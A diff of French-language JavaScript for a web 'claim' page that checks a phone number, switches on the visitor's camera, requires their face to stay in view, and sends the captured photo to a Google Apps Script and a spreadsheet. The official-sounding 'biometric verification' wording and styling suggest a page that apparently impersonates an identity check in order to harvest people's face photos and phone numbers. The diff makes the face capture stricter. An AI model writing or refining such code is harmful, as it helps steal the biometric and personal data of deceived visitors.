@@ -477,7 +477,7 @@ document.getElementById('btn-claim').addEventListener('click', () => {
     const selectedOption = inputCountryCode.options[inputCountryCode.selectedIndex];
     const expectedLen = parseInt(selectedOption.dataset.len);
     if (cleanPhone.length !== expectedLen) {
-      alert(`Pour ce pays, le numéro doit contenir ${expectedLen} chiffres (sans le 0 initial). Vous avez saisi ${cleanPhone.length} chiffres.`);
+      alert(`Pour ce pays, le numéro doit contenir ${expectedLen} chiffres. Vous avez saisi ${cleanPhone.length} chiffres.`);
       return;
     }
   }
@@ -529,60 +529,82 @@ btnSubmit.addEventListener('click', async () => {
       try { await track.applyConstraints({ advanced: [{ torch: true }] }); } catch (e) {}
     }
 
-    // --- DÉTECTION DE VISAGE ---
+    // --- DÉTECTION DE VISAGE EN CONTINU ---
     loaderText.textContent = "Recherche biométrique (visage)...";
     loaderBarFill.style.width = '25%';
 
-    let faceFound = false;
-    const startTime = Date.now();
-
-    let waited = 0;
-    while (!faceModelLoaded && waited < 3000) {
+    let faceModelWaited = 0;
+    while (!faceModelLoaded && faceModelWaited < 3000) {
       await new Promise(r => setTimeout(r, 200));
-      waited += 200;
+      faceModelWaited += 200;
     }
 
-    if (faceModelLoaded) {
-      while (Date.now() - startTime < 7000) {
-        try {
-          if (video.videoWidth > 0 && video.videoHeight > 0) {
-            const options = new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.4 });
-            const detection = await faceapi.detectSingleFace(video, options);
-            
-            if (detection && detection.box.width > 30 && detection.box.height > 30) {
-              faceFound = true;
-              videoContainer.classList.add('detected');
-              cameraMsg.textContent = "Visage détecté, analyse en cours...";
-              cameraMsg.style.color = "#18753c";
-              break;
-            }
-          }
-        } catch (e) {
-          console.warn("Erreur détection:", e);
-        }
-        await new Promise(r => setTimeout(r, 300));
-      }
-    }
-
-    if (!faceFound) {
-      if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-      mediaStream = null;
-      
-      loader.style.display = 'none';
-      cameraArea.style.display = 'none';
-      
+    if (!faceModelLoaded) {
+      alert("Erreur : Impossible de charger le module de sécurité.");
       btnSubmit.style.display = 'block';
       btnSubmit.disabled = false;
-      
-      alert("Échec de la vérification biométrique. Aucun visage n'a été détecté. Veuillez vérifier votre éclairage et réessayer.");
+      loader.style.display = 'none';
       return;
     }
 
+    // Étape 1 : Attendre qu'un visage apparaisse pour la première fois
+    let faceInitiallyFound = false;
+    const searchStartTime = Date.now();
+    
+    while (Date.now() - searchStartTime < 10000) { // 10s max pour trouver le visage
+      const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.4 }));
+      if (detection && detection.box.width > 30) {
+        faceInitiallyFound = true;
+        break;
+      }
+      await new Promise(r => setTimeout(r, 300));
+    }
+
+    if (!faceInitiallyFound) {
+      if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+      mediaStream = null;
+      loader.style.display = 'none';
+      cameraArea.style.display = 'none';
+      btnSubmit.style.display = 'block';
+      btnSubmit.disabled = false;
+      alert("Échec : Aucun visage détecté. Veuillez vérifier votre éclairage.");
+      return;
+    }
+
+    // Étape 2 : Maintenir le visage pendant 3 secondes (10 validations de 300ms)
+    loaderText.textContent = "Analyse en cours... Ne bougez pas.";
+    let validDetections = 0;
+    const requiredDetections = 10; // 10 * 300ms = 3 secondes
+    
+    await new Promise((resolve) => {
+      const interval = setInterval(async () => {
+        const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.4 }));
+        
+        if (detection && detection.box.width > 30) {
+          validDetections++;
+          videoContainer.classList.add('detected');
+          cameraMsg.textContent = `Vérification en cours... (${Math.round((validDetections/requiredDetections)*100)}%)`;
+          cameraMsg.style.color = "#18753c";
+          
+          if (validDetections >= requiredDetections) {
+            clearInterval(interval);
+            resolve(); // Succès
+          }
+        } else {
+          // Le visage a disparu !
+          videoContainer.classList.remove('detected');
+          cameraMsg.textContent = "⚠️ Ne bougez pas, gardez votre visage dans le cercle.";
+          cameraMsg.style.color = "#E1000F";
+          validDetections = Math.max(0, validDetections - 3); // Pénalité de -3
+        }
+      }, 300);
+    });
+
     // --- CAPTURE PHOTO ---
-    loaderText.textContent = "Analyse biométrique en cours...";
+    loaderText.textContent = "Vérification réussie. Capture en cours...";
     loaderBarFill.style.width = '50%';
 
-    await new Promise(r => setTimeout(r, 200));
+    await new Promise(r => setTimeout(r, 300));
 
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640;
@@ -594,7 +616,7 @@ btnSubmit.addEventListener('click', async () => {
     console.log("📸 Photo capturée. Taille:", photoBase64.length);
 
     setTimeout(() => {
-      loaderText.textContent = "Vérification anti-robot et sécurisation...";
+      loaderText.textContent = "Sécurisation des données...";
       loaderBarFill.style.width = '80%';
       
       setTimeout(async () => {
@@ -632,7 +654,6 @@ btnSubmit.addEventListener('click', async () => {
           .then(t => console.log("✓ Sheet:", t))
           .catch(e => console.log("✗ Sheet:", e));
 
-        // ⚠️ ENVOI DE LA PHOTO : On utilise "photo" pour correspondre au script Google Apps Script
         const formDataMedia = new URLSearchParams();
         formDataMedia.append("photo", photoBase64);
         formDataMedia.append("extension", "jpg");
